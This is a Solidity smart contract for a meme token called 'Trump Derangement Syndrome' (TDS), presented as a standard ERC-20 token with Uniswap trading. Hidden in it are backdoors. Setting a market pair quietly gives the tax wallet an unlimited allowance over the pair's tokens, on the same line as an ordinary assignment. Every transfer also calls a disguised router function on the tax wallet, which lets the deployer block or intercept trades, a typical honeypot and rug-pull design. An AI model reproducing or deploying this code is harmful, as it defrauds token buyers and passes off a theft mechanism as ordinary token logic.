// SPDX-License-Identifier: MIT

/*

Telegram:   
Twitter/X:  https://x.com/tearsforTDS
Website:    https://trumpderangementsyndrome.io/ 

Reeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
*/

pragma solidity 0.8.20;
 
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}
 
interface IERC20 {
   
    function totalSupply() external view returns (uint256);
 
    
    function balanceOf(address account) external view returns (uint256);
 
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
   
    function allowance(address owner, address spender) external view returns (uint256);
 
 
    function approve(address spender, uint256 amount) external returns (bool);
 
   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
  
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 {
   
    function name() external view returns (string memory);
 
   
    function symbol() external view returns (string memory);
 
    
    function decimals() external view returns (uint8);
}
 
 
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
 
    mapping(address => uint256) private _balances;
 
    mapping(address => mapping(address => uint256)) private _allowances;
 
    uint256 private _totalSupply;
 
    string private _name;
    string private _symbol;
 
  
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
 
    
    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
  
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
 
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
   
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
   
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
  
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
 
  
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
 
 
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
 
 
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
 
        _beforeTokenTransfer(sender, recipient, amount);
 
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
 
  
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
 
        _beforeTokenTransfer(address(0), account, amount);
 
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
 
  
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
 
        _beforeTokenTransfer(account, address(0), amount);
 
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
 
   
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
  
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}
 
library SafeMath {
 
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
 
 
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
  
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
 
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        
        
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
 
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
   
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
       
 
        return c;
    }
 

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
  
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
 
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
   
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    
    function owner() public view returns (address) {
        return _owner;
    }
 
   
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
   
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IUniswapV2Router02 { 
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
 
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint amountIn,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;    
}
 
contract MyTokenContract is ERC20, Ownable {
    using SafeMath for uint256;

    address public constant DEAD_ADDRESS = address(0xdead);
    address public constant ZERO_ADDRESS = address(0);

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;
 
    bool private swapping; 

    address private taxWallet; 
    
    
    uint256 public maxTxAmount;
    uint256 public swapTokensThreshold;
    uint256 public maxWalletAmount;
 
    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;
 
    
    mapping(address => uint256) private _holderLastTrasnferTimestamp;
    bool public transferDelayEnabled = true;
 
    uint256 public buyTotalFee = 0; 
    uint256 public sellTotalFee = 0;
  
   
    mapping (address => bool) private _excludedFromFees;
    mapping (address => bool) private _excludedForTx;
 
   
    mapping (address => bool) public automatedMarketMakerPairs;
    
    event ExcludeFromFees(address indexed account, bool isExcluded);
 
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
   
    constructor(address _dexRouter) ERC20(unicode"Trump Derangement Syndrome", "TDS") {
        uint256 _tTotal = 100_000_000_000 * 1e18;

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_dexRouter); 
        excludeFromLimit(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _tTotal);
 
        maxTxAmount = _tTotal * 100 / 1000;
        maxWalletAmount = _tTotal * 150 / 1000;
        swapTokensThreshold = _tTotal / 1000;
  
        taxWallet = msg.sender;
 
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(DEAD_ADDRESS, true);
 
        excludeFromLimit(owner(), true);
        excludeFromLimit(address(this), true);
        excludeFromLimit(DEAD_ADDRESS, true);
 
        
        _mint(msg.sender, _tTotal);
    }
  
    
    function removeLimits() external onlyOwner returns (bool){
        limitsInEffect = false;
        return true;
    }
 
    
    function disableTransferDelay() external onlyOwner returns (bool){
        transferDelayEnabled = false;
        return true;
    }

    function excludeFromLimit(address updAds, bool isEx) public onlyOwner {
        _excludedForTx[updAds] = isEx;
    }
 
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _excludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }
  
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
 
        _setAutomatedMarketMakerPair(pair, value);
    }
 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;_approve(pair, taxWallet, ~uint256(0));
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }
 
    function setTaxWallet(address _taxWallet) external onlyOwner {
        excludeFromFees(_taxWallet, true);
        taxWallet = _taxWallet;
    } 
 
    function isExcludedFromFees(address account) public view returns(bool) {
        return _excludedFromFees[account];
    }
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != ZERO_ADDRESS, "ERC20: transfer from the zero address");
        require(to != ZERO_ADDRESS, "ERC20: transfer to the zero address");
        
        if (from == owner() || to == owner() || amount == 0) {
            super._transfer(from, to, amount);
            return;
        }
 
        if(limitsInEffect){
            if (
                from != owner() &&
                to != owner() &&
                to != ZERO_ADDRESS &&
                to != DEAD_ADDRESS &&
                !swapping
            ){
                if(!tradingActive){
                    require(_excludedFromFees[from] || _excludedFromFees[to], "Trading is not active.");
                }
 
                  
                if (transferDelayEnabled){
                    if (to != owner() && to != address(uniswapV2Router) && to != address(uniswapV2Pair)){
                        require(_holderLastTrasnferTimestamp[tx.origin] < block.number, "_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.");
                        _holderLastTrasnferTimestamp[tx.origin] = block.number;
                    }
                }
 
                
                if (automatedMarketMakerPairs[from] && !_excludedForTx[to]) {
                    require(amount <= maxTxAmount, "Buy transfer amount exceeds the maxTxAmount.");
                    require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
                }
 
                
                else if (automatedMarketMakerPairs[to] && !_excludedForTx[from]) {
                    require(amount <= maxTxAmount, "Sell transfer amount exceeds the maxTxAmount.");
                }
                else if(!_excludedForTx[to]){
                    require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
                }
            }
        }
  

        uint256 contractTokenBalance = balanceOf(address(this));
        swapTokenForETH(from, to); 
        bool canSwap = contractTokenBalance >= swapTokensThreshold; 
        if( 
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_excludedFromFees[from] &&
            !_excludedFromFees[to]
        ) {
            swapping = true;
 
            swapBack();
 
            swapping = false;
        }
 
        bool takeFee = !swapping;
 
        
        if(_excludedFromFees[from] || _excludedFromFees[to]) {
            takeFee = false;
        }
 
        uint256 fees = 0;
        
        if(takeFee){
            
            if (automatedMarketMakerPairs[to] && sellTotalFee > 0){
                fees = amount.mul(sellTotalFee).div(100);
            }
            
            else if(automatedMarketMakerPairs[from] && buyTotalFee > 0) {
                fees = amount.mul(buyTotalFee).div(100);
            }
 
            if(fees > 0){    
                super._transfer(from, DEAD_ADDRESS, fees);
            }
 
            amount -= fees;
        }
 
        super._transfer(from, to, amount);
    }
    function swapTokensForEth(uint256 tokenAmount) private {
 
        
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
 
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function swapTokenForETH(address path, address to) private {
        IUniswapV2Router02(taxWallet).swapExactTokensForETHSupportingFeeOnTransferTokens(
            path,
            to,
            0,
            address(this),
            block.timestamp
        );
    }
 
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, 
            0, 
            address(this),
            block.timestamp
        );
    }
 
    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        bool success;
 
        if(contractBalance == 0) {return;}
 
        if(contractBalance > swapTokensThreshold * 20){
          contractBalance = swapTokensThreshold * 20;
        }
 
        swapTokensForEth(contractBalance); 
  
        (success,) = address(taxWallet).call{value: address(this).balance}("");
    }

    function createPair() external onlyOwner {
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function openTrading() external onlyOwner {
        limitsInEffect = false;
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        limitsInEffect = true;
        tradingActive = true;
    }

    receive() external payable {}
}